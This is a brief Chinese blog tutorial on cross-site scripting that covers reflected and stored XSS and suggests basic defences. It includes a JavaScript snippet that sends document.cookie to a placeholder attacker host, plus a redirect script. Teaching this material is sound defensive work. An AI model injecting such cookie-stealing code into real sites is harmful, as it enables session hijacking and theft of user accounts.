---
title: XSS攻击
date: 2019-4-19
tags: 前端
author: 映雪
---

浮云吹作雪，世味煮成茶。

<!--more-->

### XSS 攻击

- XSS 是跨站脚本攻击(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为 XSS。**恶意攻击者往 Web 页面里插入恶意 Script 代码，当用户浏览该页之时，嵌入其中 Web 里面的 Script 代码会被执行，从而达到恶意攻击用户的目的**。

### XSS 攻击条件

1. 需要向 web 页面注入恶意代码。
2. 这些恶意代码能够被浏览器成功的执行。

### XSS 类型

1. XSS 反射型攻击:恶意代码并没有保存在目标网站，通过引诱用户点击一个链接到目标网站的恶意链接来实施攻击的。

2. XSS 存储型攻击:恶意代码被保存到目标网站的服务器中，这种攻击具有较强的稳定性和持久性。比较常见场景是在博客，论坛等社交网站上，但 OA 系统，和 CRM 系统上也能看到它身影，比如：某 CRM 系统的客户投诉功能上存在 XSS 存储型漏洞，黑客提交了恶意攻击代码，当系统管理员查看投诉信息时恶意代码执行，窃取了客户的资料，然而管理员毫不知情，这就是典型的 XSS 存储型攻击。

### XSS 攻击能做些什么？

1. 窃取 cookie，读取目标网站的 cookie 发送到黑客的服务器上，盗用 cookie 实现无密码登录

```js
var i = document.createElement('img');
document.body.appendChild(i);
i.src = 'http://www.hackerserver.com/?c=' + document.cookie;
```

2. 劫持流量实现恶意跳转

```js
<script>window.location.href="http://www.baidu.com";</script>
```

### 解决

1. 过滤,对诸如 `<script>、<img>、<a>`等标签进行过滤。
2. 编码,像一些常见的符号，如<>在输入的时候要对其进行转换编码，这样做浏览器是不会对该标签进行解释执行的，同时也不影响显示效果。
3. 限制,通过以上的案例我们不难发现 XSS 攻击要能达成往往需要较长的字符串，因此对于一些可以预期的输入可以通过限制长度强制截断来进行防御。
